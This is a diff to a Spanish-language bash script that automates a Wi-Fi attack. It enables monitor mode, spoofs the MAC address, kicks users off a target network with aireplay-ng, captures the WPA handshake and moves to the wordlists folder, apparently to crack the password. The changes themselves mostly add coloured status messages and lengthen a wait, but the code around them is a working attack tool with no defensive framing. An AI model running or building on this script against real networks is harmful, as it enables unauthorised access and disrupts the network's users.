@@ -45,7 +45,7 @@ if [ $airtest -eq 0 ]; then
 			echo -e "${blueColour}"
 			read -p "[?] Que tarjeta deseas usar: " tar
 			$cleancolor
-			echo -e "\n[*] Se esta iniciando el modo monitor y cambiando tu dirrecion MAC en $tar\n"
+			echo -e "\n${redColour}[*] Se esta iniciando el modo monitor y cambiando tu dirrecion MAC en $tar\n"
 			airmon-ng start $tar > /dev/null 2>&1
 			ifconfig ${tar}mon down && macchanger -a ${tar}mon > /dev/null 2>&1
 			ifconfig ${tar}mon up
@@ -62,6 +62,7 @@ if [ $airtest -eq 0 ]; then
 					read -p "[?] En que canal esta ${ap}?: " channel
 					$cleancolor
 					echo -e "${greenColour}[*] Se esta desautenticando a los usuarios de la red"
+					$cleancolor
 					kill -9 $airodump_xterm_PID
 					wait $airodump_xterm_PID 2>/dev/null
 
@@ -72,7 +73,9 @@ if [ $airtest -eq 0 ]; then
 					aireplay_xterm_PID=$!
 					sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
 
-					sleep 15; kill -9 $airodump_filter_xterm_PID
+					echo -e "${redColour}\nEsperando Handshake\n"
+					$cleancolor
+					sleep 20; kill -9 $airodump_filter_xterm_PID
 					wait $airodump_filter_xterm_PID 2>/dev/null
 					
 					cd /usr/share/wordlists
